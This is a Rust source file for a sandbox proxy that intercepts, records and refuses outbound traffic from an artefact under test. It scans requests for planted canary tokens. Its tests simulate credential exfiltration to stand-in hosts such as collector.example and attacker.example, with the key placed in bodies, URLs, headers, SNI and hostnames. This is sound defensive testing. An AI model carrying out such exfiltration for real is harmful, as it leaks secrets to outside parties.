//! The intercepting proxy.
//!
//! The guest has no route to the internet; this is the only door, and it is
//! locked. Every request is decrypted, recorded in full, and then answered
//! locally — Slice 0 has an empty allowlist, because an artefact under test has
//! no destination it is entitled to reach. The refusal is not the product. The
//! **record** is.
//!
//! The answer defaults to `403 blocked by the detonation chamber`, and an
//! operator may replace it with a plausible one ([`crate::consequence`]) so the
//! response itself stops announcing the chamber. That choice moves only what
//! the guest is told. The recording happens first and is identical either way,
//! and neither answer is forwarded from an origin — both are built here, from
//! bytes this process already holds.
//!
//! # Two traps, both of which look like success
//!
//! **CONNECT arrives before the tunnel exists.** The proxy library dispatches
//! this handler for the outer `CONNECT` request, and only afterwards decides
//! whether to establish and intercept the tunnel. The obvious reading of
//! "empty allowlist, so refuse everything" therefore refuses the CONNECT, the
//! TLS session is never established, nothing is ever decrypted, and the run
//! ends with a log full of CONNECT lines and no bodies — while appearing to
//! have worked perfectly. So CONNECT is passed through untouched, and the
//! refusal applies to the requests *inside* the tunnel.
//!
//! **Declining to intercept is not blocking.** Returning `false` from either
//! intercept predicate makes the library open a real socket to the origin and
//! copy bytes in both directions. A `false` there does not deny egress; it
//! grants it, unobserved. Both are pinned to `true`, with a test that asserts
//! exactly that, because the failure mode is silent and the fix reads like an
//! optimisation.

use std::sync::Arc;

use chamber_evidence::{CanaryHit, CapturedBody, Channel, Digest32, HitField, ObservationKind};
use http_body_util::BodyExt;
use hudsucker::hyper::{Method, Request, Response, StatusCode};
use hudsucker::{Body, HttpContext, HttpHandler, RequestOrResponse};
use sha2::{Digest, Sha256};

use crate::CanarySet;
use crate::consequence::{ConsequencePlan, ConsequenceResponse};
use crate::recorder::Recorder;

/// How much of a body is retained in the bundle.
///
/// A cap on what is *kept*, never on what is *scanned*: the canary search runs
/// over the whole body before anything is discarded. Clipping first would let
/// an artefact defeat the highest-signal detector in the system by padding.
const MAX_RETAINED_BODY: usize = 64 * 1024;

/// Records everything that reaches it, and lets nothing through.
///
/// hudsucker clones the handler once per connection, so `sni` is per-connection
/// state: [`should_intercept_tls`](HttpHandler::should_intercept_tls) reads the
/// server name out of the TLS ClientHello and stashes it here, and the requests
/// that follow on that same connection carry it into their observations. It is
/// recorded *separately* from the request authority on purpose — a CONNECT to
/// one host with an SNI for another is domain fronting, and only keeping both
/// can tell them apart.
#[derive(Clone)]
pub struct InterceptingProxy {
    recorder: Arc<Recorder>,
    canaries: CanarySet,
    sni: Option<String>,
    /// What to answer intercepted requests with instead of the refusal. `None`
    /// — the default — is the 403, and is what an ordinary detonation uses.
    /// `Some` is a **fabricated** response, never a forwarded one: see
    /// [`crate::consequence`].
    consequence: Option<ConsequencePlan>,
}

impl InterceptingProxy {
    /// What both intercept predicates answer.
    ///
    /// Routed through one constant so the decision is visible and testable in
    /// one place. `false` does **not** deny a connection — it makes the library
    /// open a socket to the origin and copy bytes both ways, which is live
    /// egress that nothing observes. The failure is silent and the change reads
    /// like an optimisation, so it is pinned by `intercept_predicates_are_true`
    /// rather than left to a reviewer to notice.
    pub const INTERCEPT_EVERYTHING: bool = true;

    pub fn new(recorder: Arc<Recorder>, canaries: CanarySet) -> Self {
        Self {
            recorder,
            canaries,
            sni: None,
            consequence: None,
        }
    }

    /// Answer intercepted requests with an operator-supplied response instead
    /// of the refusal.
    ///
    /// Opt-in, and separate from [`new`](Self::new) so that consequence mode is
    /// something a caller has to ask for by name. Passing `None` is the default
    /// and changes nothing.
    ///
    /// This does **not** grant egress. The response is built here, from bytes
    /// the operator supplied, and the request that prompted it is discarded at
    /// the boundary exactly as a refused one is.
    #[must_use]
    pub fn with_consequence(mut self, consequence: Option<ConsequencePlan>) -> Self {
        self.consequence = consequence;
        self
    }

    /// Record a request and decide its fate.
    ///
    /// Separated from the trait so the whole decision is testable without a
    /// socket, a certificate, or a running proxy.
    pub async fn observe_and_decide(&self, req: Request<Body>) -> RequestOrResponse {
        let is_connect = req.method() == Method::CONNECT;
        let (parts, body) = req.into_parts();

        let method = parts.method.to_string();
        let target = parts.uri.to_string();
        let authority = parts
            .uri
            .authority()
            .map(|a| a.to_string())
            .or_else(|| {
                parts
                    .headers
                    .get(hudsucker::hyper::header::HOST)
                    .and_then(|h| h.to_str().ok())
                    .map(str::to_owned)
            })
            .unwrap_or_default();

        let headers: Vec<(String, String)> = parts
            .headers
            .iter()
            .map(|(k, v)| {
                (
                    k.as_str().to_owned(),
                    String::from_utf8_lossy(v.as_bytes()).into_owned(),
                )
            })
            .collect();

        // A CONNECT carries no body worth reading, and consuming it would break
        // the tunnel we are about to allow.
        let raw = if is_connect {
            Vec::new()
        } else {
            match body.collect().await {
                Ok(collected) => collected.to_bytes().to_vec(),
                // An unreadable body is still an attempt worth recording. The
                // request happened; only its content is unknown.
                Err(_) => Vec::new(),
            }
        };

        let mut hits = self.scan_metadata(&target, &authority, &headers);
        hits.extend(self.canaries.scan(HitField::Body, &raw));

        // The name from the ClientHello of the connection this request arrived
        // on, if it was an intercepted TLS one. A CONNECT arrives before any
        // TLS, so it carries none — which is correct, not a gap.
        let sni = self.sni.clone();
        if let Some(name) = &sni {
            hits.extend(self.canaries.scan_sni(name));
        }

        self.recorder.note(
            Channel::NetworkEgress,
            ObservationKind::HttpExchange {
                method,
                authority,
                sni,
                target,
                headers,
                body: retain(raw),
            },
            hits,
        );

        if is_connect {
            // Pass it through so the tunnel is established and its contents
            // become visible. See the module note.
            return RequestOrResponse::Request(Request::from_parts(parts, Body::empty()));
        }

        // The request stops here either way — this arm is `Response`, never
        // `Request`, so nothing is forwarded to the origin. The only thing
        // consequence mode changes is what the guest is *told*, and both
        // answers are built from bytes this process already holds.
        RequestOrResponse::Response(match &self.consequence {
            // Routed on the PATH, with the query dropped. The requests under
            // study carry `?sig=…`; matching the whole target would miss every
            // one of them and quietly serve the fallback, so the run would look
            // configured while answering the one request that matters with a 404.
            Some(plan) => Self::fabricate(plan.response_for(parts.uri.path())),
            None => Self::refusal(),
        })
    }

    /// The default answer: nothing is entitled to leave, and it says so.
    fn refusal() -> Response<Body> {
        Response::builder()
            .status(StatusCode::FORBIDDEN)
            .body(Body::from("blocked by the detonation chamber"))
            .expect("a static refusal response is always well-formed")
    }

    /// The operator's answer, **built** rather than fetched.
    ///
    /// Every byte here came from the configuration. Nothing in this function
    /// can reach the network, which is the property that makes consequence mode
    /// a change of story rather than a change of containment.
    fn fabricate(configured: &ConsequenceResponse) -> Response<Body> {
        // Range-checked when the ConsequenceResponse was constructed, so
        // neither of these can fail today. They fall back to the refusal rather
        // than panicking anyway: if that check ever slips, a boundary that
        // keeps refusing is the safe direction to fail in, and a panicking one
        // takes the observer down mid-run.
        let Ok(status) = StatusCode::from_u16(configured.status()) else {
            return Self::refusal();
        };
        Response::builder()
            .status(status)
            .body(Body::from(configured.body().to_owned()))
            .unwrap_or_else(|_| Self::refusal())
    }

    /// Scan everything about a request that is not its body.
    ///
    /// A token can leave in a URL, a header value, or the hostname itself —
    /// a lookup for `AKIA….attacker.example` needs no body at all.
    fn scan_metadata(
        &self,
        target: &str,
        authority: &str,
        headers: &[(String, String)],
    ) -> Vec<CanaryHit> {
        let mut hits = self.canaries.scan(HitField::Target, target.as_bytes());
        hits.extend(self.canaries.scan_dns_name(authority));
        for (_, value) in headers {
            hits.extend(self.canaries.scan(HitField::Header, value.as_bytes()));
        }
        hits
    }
}

/// Keep the body, or keep a prefix and commit to the rest.
///
/// A clipped body records its true length and a digest of the whole, so a
/// reader can tell "this is all of it" from "this is the start of it". The
/// difference decides whether an absence of evidence means anything.
fn retain(raw: Vec<u8>) -> CapturedBody {
    if raw.len() <= MAX_RETAINED_BODY {
        return CapturedBody::Whole { bytes: raw };
    }

    let digest = Digest32(Sha256::digest(&raw).into());
    CapturedBody::Clipped {
        retained: raw[..MAX_RETAINED_BODY].to_vec(),
        full_len: raw.len() as u64,
        full_digest: digest,
    }
}

impl HttpHandler for InterceptingProxy {
    async fn handle_request(
        &mut self,
        _ctx: &HttpContext,
        req: Request<Body>,
    ) -> RequestOrResponse {
        self.observe_and_decide(req).await
    }

    async fn should_intercept_connect(&mut self, _ctx: &HttpContext, _req: &Request<Body>) -> bool {
        Self::INTERCEPT_EVERYTHING
    }

    async fn should_intercept_tls(
        &mut self,
        _ctx: &HttpContext,
        client_hello: hudsucker::rustls::server::ClientHello<'_>,
    ) -> bool {
        // The handler is a per-connection clone, so this name belongs to the
        // requests that will follow on this connection. Recorded even though we
        // always intercept: the SNI is evidence of where the guest meant to go,
        // which the request authority can disagree with.
        self.sni = client_hello.server_name().map(str::to_owned);
        Self::INTERCEPT_EVERYTHING
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::{Canary, CanarySet};
    use chamber_evidence::HitEncoding;

    const TOKEN: &str = "AKIAIOSFODNN7EXAMPLE";

    fn proxy(recorder: &Arc<Recorder>) -> InterceptingProxy {
        InterceptingProxy::new(
            Arc::clone(recorder),
            CanarySet::new(vec![Canary::new("aws-key", TOKEN)]),
        )
    }

    /// A page with the shape of a real one: a status worth believing and a body
    /// with newlines in it.
    const STARTER_PAGE: &str = "<!doctype html>\n<title>Starter</title>\n<p>ok</p>\n";

    fn responding_proxy(recorder: &Arc<Recorder>) -> InterceptingProxy {
        proxy(recorder).with_consequence(Some(ConsequencePlan::single(
            ConsequenceResponse::new(200, STARTER_PAGE).expect("200 is a status code"),
        )))
    }

    async fn body_of(res: Response<Body>) -> String {
        let bytes = res
            .into_body()
            .collect()
            .await
            .expect("read body")
            .to_bytes();
        String::from_utf8(bytes.to_vec()).expect("utf-8")
    }

    fn post(target: &str, body: impl Into<Body>) -> Request<Body> {
        Request::builder()
            .method(Method::POST)
            .uri(target)
            .header("host", "collector.example")
            .body(body.into())
            .unwrap()
    }

    /// THE test this module was written around, before any refusal logic
    /// existed. A CONNECT must survive untouched, or TLS is never intercepted
    /// and the proxy captures nothing while appearing to work.
    #[tokio::test]
    async fn connect_is_passed_through_untouched() {
        let r = Arc::new(Recorder::new());
        let req = Request::builder()
            .method(Method::CONNECT)
            .uri("collector.example:443")
            .body(Body::empty())
            .unwrap();

        match proxy(&r).observe_and_decide(req).await {
            RequestOrResponse::Request(passed) => {
                assert_eq!(passed.method(), Method::CONNECT);
                assert_eq!(passed.uri().to_string(), "collector.example:443");
            }
            RequestOrResponse::Response(res) => panic!(
                "CONNECT must not be answered here — status {} would kill the tunnel \
                 before TLS is established and capture nothing",
                res.status()
            ),
        }

        // Still recorded: if TLS interception later fails, this is the only
        // evidence of where the guest tried to go.
        assert_eq!(r.len(), 1);
    }

    /// `false` here means "tunnel transparently to the origin", not "block".
    /// A future tidy-up that flips this turns the containment proxy into a
    /// working egress path, and nothing else in the system would notice.
    ///
    /// (`HttpContext` is non-exhaustive, so the predicates cannot be invoked
    /// directly from a test. Both return this constant, which is why routing
    /// them through it is worth the indirection.)
    #[test]
    // Asserting on a constant is the point: the constant is the security
    // decision, and a change to it must break a test rather than pass review
    // as a tidy-up. Verified by mutation — flipping it fails this test.
    #[allow(clippy::assertions_on_constants)]
    fn intercept_predicates_are_true() {
        assert!(
            InterceptingProxy::INTERCEPT_EVERYTHING,
            "declining to intercept does not block a connection, it tunnels it \
             transparently to the origin — live egress that nothing records"
        );
    }

    #[tokio::test]
    async fn an_ordinary_request_is_refused_and_recorded() {
        let r = Arc::new(Recorder::new());
        let decision = proxy(&r)
            .observe_and_decide(post("http://collector.example/ingest", "hello"))
            .await;

        match decision {
            RequestOrResponse::Response(res) => assert_eq!(res.status(), StatusCode::FORBIDDEN),
            RequestOrResponse::Request(_) => panic!("an empty allowlist must refuse"),
        }
        assert_eq!(r.len(), 1);
    }

    // ---- consequence mode ---------------------------------------------------
    //
    // The property under test throughout: the *story* the guest is told changes,
    // and nothing else does. Containment, recording and detection are the same
    // in both modes, and the tests below pin each of those separately — because
    // a regression in any one of them would leave the other two looking fine.

    /// The point of the mode. An eval-aware artefact that reads the response
    /// learns nothing from it.
    #[tokio::test]
    async fn a_configured_consequence_answers_in_place_of_the_refusal() {
        let r = Arc::new(Recorder::new());
        let decision = responding_proxy(&r)
            .observe_and_decide(post("http://collector.example/starter", "hello"))
            .await;

        match decision {
            RequestOrResponse::Response(res) => {
                assert_eq!(res.status(), StatusCode::OK);
                assert_eq!(body_of(res).await, STARTER_PAGE);
            }
            RequestOrResponse::Request(_) => {
                panic!("consequence mode answered by forwarding, which is live egress")
            }
        }
    }

    /// A routed plan picks by path, and does so on a REAL request target —
    /// absolute-form, with a query string on it, which is the shape an
    /// intercepted HTTPS request actually arrives in. If the query were not
    /// stripped, `/starter?sig=…` would match no rule and quietly receive the
    /// fallback: the run would look configured while answering the one request
    /// under study with the wrong thing.
    #[tokio::test]
    async fn a_routed_plan_answers_each_path_on_a_real_request_target() {
        let plan = ConsequencePlan::new(
            vec![
                (
                    "/challenge".to_owned(),
                    ConsequenceResponse::new(200, "{\"nonce\":\"c7f3\"}").unwrap(),
                ),
                (
                    "/starter".to_owned(),
                    ConsequenceResponse::new(200, STARTER_PAGE).unwrap(),
                ),
            ],
            ConsequenceResponse::new(404, "not found").unwrap(),
        )
        .unwrap();

        let r = Arc::new(Recorder::new());
        let p = proxy(&r).with_consequence(Some(plan));

        for (target, expect_status, expect_body) in [
            (
                "https://collector.example/challenge",
                200,
                "{\"nonce\":\"c7f3\"}",
            ),
            (
                "https://collector.example/starter?sig=abc123",
                200,
                STARTER_PAGE,
            ),
            ("https://collector.example/unmapped", 404, "not found"),
        ] {
            match p.observe_and_decide(post(target, "")).await {
                RequestOrResponse::Response(res) => {
                    assert_eq!(res.status().as_u16(), expect_status, "status for {target}");
                    assert_eq!(body_of(res).await, expect_body, "body for {target}");
                }
                RequestOrResponse::Request(_) => panic!("{target} was forwarded"),
            }
        }
    }

    /// Left as `None`, nothing changes. The 403 is what an ordinary detonation
    /// gets, and it must not need any configuration to get it.
    #[tokio::test]
    async fn the_refusal_is_still_the_default() {
        let r = Arc::new(Recorder::new());
        let decision = proxy(&r)
            .observe_and_decide(post("http://collector.example/ingest", "hello"))
            .await;

        match decision {
            RequestOrResponse::Response(res) => {
                assert_eq!(res.status(), StatusCode::FORBIDDEN);
                assert_eq!(body_of(res).await, "blocked by the detonation chamber");
            }
            RequestOrResponse::Request(_) => panic!("an empty allowlist must refuse"),
        }
    }

    /// THE safety invariant. A plausible answer is a fabrication, not a relay:
    /// there is no configuration of this proxy under which an intercepted
    /// request is handed to the origin. `Request` on this path would make the
    /// library open a socket and copy bytes, which is exactly the egress the
    /// chamber exists to deny — and the run would still look like it worked.
    #[tokio::test]
    async fn consequence_mode_never_forwards_an_intercepted_request() {
        let r = Arc::new(Recorder::new());
        for target in [
            "http://collector.example/ingest",
            "https://collector.example/ingest",
            "http://docs.example/index.html",
        ] {
            match responding_proxy(&r)
                .observe_and_decide(post(target, "payload"))
                .await
            {
                RequestOrResponse::Response(_) => {}
                RequestOrResponse::Request(_) => panic!(
                    "{target} was forwarded to its origin. Consequence mode fabricates \
                     a response; it must never become a route to the internet."
                ),
            }
        }
    }

    /// The recording is the product, and it happens before the answer is
    /// chosen. A mode that changed what is recorded would be buying realism
    /// with evidence, which is not a trade this tool may make.
    #[tokio::test]
    async fn a_fabricated_answer_records_the_request_exactly_as_a_refusal_does() {
        let refused = Arc::new(Recorder::new());
        proxy(&refused)
            .observe_and_decide(post("http://collector.example/ingest", "column=email"))
            .await;

        let answered = Arc::new(Recorder::new());
        responding_proxy(&answered)
            .observe_and_decide(post("http://collector.example/ingest", "column=email"))
            .await;

        assert_eq!(refused.len(), 1);
        assert_eq!(answered.len(), 1);
        assert_eq!(
            answered.observations()[0].kind(),
            refused.observations()[0].kind(),
            "consequence mode changed what was recorded, not just what was answered"
        );
    }

    /// Detection must survive the mode. If a plausible response could mask a
    /// canary crossing, consequence mode would convert real leaks into clean
    /// results — a false clean bought with realism.
    #[tokio::test]
    async fn a_token_still_witnesses_when_the_boundary_answers_plausibly() {
        let r = Arc::new(Recorder::new());
        responding_proxy(&r)
            .observe_and_decide(post(
                "http://collector.example/ingest",
                format!("key={TOKEN}"),
            ))
            .await;

        assert!(
            r.observations()[0].is_witness(),
            "the canary stopped being a witness once the boundary started \
             answering plausibly"
        );
    }

    /// The CONNECT trap, in the new mode. If the fabricated response were
    /// returned before the CONNECT check, the tunnel would never be
    /// established, TLS would never be intercepted, and the run would capture
    /// nothing at all while every request appeared to succeed — the two failure
    /// modes in the module note, compounded.
    #[tokio::test]
    async fn connect_is_still_passed_through_when_a_consequence_is_configured() {
        let r = Arc::new(Recorder::new());
        let req = Request::builder()
            .method(Method::CONNECT)
            .uri("collector.example:443")
            .body(Body::empty())
            .unwrap();

        match responding_proxy(&r).observe_and_decide(req).await {
            RequestOrResponse::Request(passed) => assert_eq!(passed.method(), Method::CONNECT),
            RequestOrResponse::Response(res) => panic!(
                "consequence mode answered the CONNECT with {}, killing the tunnel \
                 before TLS could be intercepted. Nothing inside it would ever be seen.",
                res.status()
            ),
        }
        assert_eq!(r.len(), 1);
    }

    #[tokio::test]
    async fn the_whole_body_is_captured() {
        let r = Arc::new(Recorder::new());
        proxy(&r)
            .observe_and_decide(post("http://collector.example/ingest", "column=email"))
            .await;

        match r.observations()[0].kind() {
            ObservationKind::HttpExchange { body, method, .. } => {
                assert_eq!(method, "POST");
                assert_eq!(
                    body,
                    &CapturedBody::Whole {
                        bytes: b"column=email".to_vec()
                    }
                );
            }
            other => panic!("expected an exchange, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn a_token_in_the_body_is_a_witness() {
        let r = Arc::new(Recorder::new());
        proxy(&r)
            .observe_and_decide(post(
                "http://collector.example/ingest",
                format!("key={TOKEN}"),
            ))
            .await;

        assert!(r.observations()[0].is_witness());
    }

    /// The name the connection negotiated in TLS rides onto the requests that
    /// follow it. Set here directly because the ClientHello it comes from needs
    /// a real handshake; that end-to-end path is proved by the fixture matrix.
    #[tokio::test]
    async fn the_connection_sni_is_recorded_on_the_requests_that_follow() {
        let r = Arc::new(Recorder::new());
        let mut p = proxy(&r);
        p.sni = Some("collector.example".into());
        p.observe_and_decide(post("http://collector.example/ingest", "column=email"))
            .await;

        match r.observations()[0].kind() {
            ObservationKind::HttpExchange { sni, .. } => {
                assert_eq!(sni.as_deref(), Some("collector.example"));
            }
            other => panic!("expected an exchange, got {other:?}"),
        }
    }

    /// A token in the SNI is the token leaving in the hostname of an
    /// otherwise-innocuous request — domain fronting. It must be a witness even
    /// when the body and URL are clean.
    #[tokio::test]
    async fn a_token_in_the_sni_is_a_witness() {
        let r = Arc::new(Recorder::new());
        let mut p = proxy(&r);
        p.sni = Some(format!("{TOKEN}.attacker.example"));
        p.observe_and_decide(post("http://front.example/ok", "nothing to see"))
            .await;

        assert!(
            r.observations()[0].is_witness(),
            "a token carried in the SNI slipped past as no finding"
        );
        assert!(
            r.observations()[0]
                .canary_hits()
                .iter()
                .any(|h| h.field == chamber_evidence::HitField::Sni),
            "the SNI hit was recorded on the wrong field, so a fronted request \
             would read as a DNS exfil"
        );
    }

    #[tokio::test]
    async fn a_token_in_the_url_is_a_witness() {
        let r = Arc::new(Recorder::new());
        proxy(&r)
            .observe_and_decide(post(
                &format!("http://collector.example/collect?d={TOKEN}"),
                "",
            ))
            .await;

        let obs = r.observations();
        assert!(obs[0].is_witness());
        assert!(
            obs[0]
                .canary_hits()
                .iter()
                .any(|h| h.field == HitField::Target)
        );
    }

    #[tokio::test]
    async fn a_token_in_a_header_is_a_witness() {
        let r = Arc::new(Recorder::new());
        let req = Request::builder()
            .method(Method::POST)
            .uri("http://collector.example/ingest")
            .header("host", "collector.example")
            .header("x-telemetry", TOKEN)
            .body(Body::from(""))
            .unwrap();

        proxy(&r).observe_and_decide(req).await;
        assert!(r.observations()[0].is_witness());
    }

    /// Ordinary traffic must not fire. Without this the tool detonates on any
    /// artefact that touches the network, which is no tool at all.
    #[tokio::test]
    async fn traffic_without_a_token_is_recorded_but_is_not_a_witness() {
        let r = Arc::new(Recorder::new());
        proxy(&r)
            .observe_and_decide(post("http://docs.example/index.html", "hello"))
            .await;

        let obs = r.observations();
        assert_eq!(obs.len(), 1);
        assert!(!obs[0].is_witness());
    }

    /// The cap limits what is kept, never what is searched. If this regresses,
    /// padding a request defeats detection entirely.
    #[tokio::test]
    async fn a_token_past_the_retention_cap_is_still_found() {
        let r = Arc::new(Recorder::new());
        let mut body = "x".repeat(MAX_RETAINED_BODY + 1024);
        body.push_str(TOKEN);

        proxy(&r)
            .observe_and_decide(post("http://collector.example/ingest", body.clone()))
            .await;

        let obs = r.observations();
        assert!(
            obs[0].is_witness(),
            "a token beyond the retention cap is still a token that left"
        );

        match obs[0].kind() {
            ObservationKind::HttpExchange {
                body:
                    CapturedBody::Clipped {
                        retained,
                        full_len,
                        full_digest,
                    },
                ..
            } => {
                assert_eq!(retained.len(), MAX_RETAINED_BODY);
                assert_eq!(*full_len, body.len() as u64);
                assert_eq!(
                    *full_digest,
                    Digest32(Sha256::digest(body.as_bytes()).into())
                );
            }
            other => panic!("expected a clipped body, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn a_hostname_carrying_a_token_is_a_witness() {
        let r = Arc::new(Recorder::new());
        let req = Request::builder()
            .method(Method::CONNECT)
            .uri(format!(
                "{}.attacker.example:443",
                TOKEN.to_ascii_lowercase()
            ))
            .body(Body::empty())
            .unwrap();

        proxy(&r).observe_and_decide(req).await;

        let obs = r.observations();
        assert!(
            obs[0].is_witness(),
            "a lower-cased token in the authority must still be caught: {:?}",
            obs[0].canary_hits()
        );
        assert!(
            obs[0]
                .canary_hits()
                .iter()
                .any(|h| h.encoding == HitEncoding::Raw)
        );
    }
}
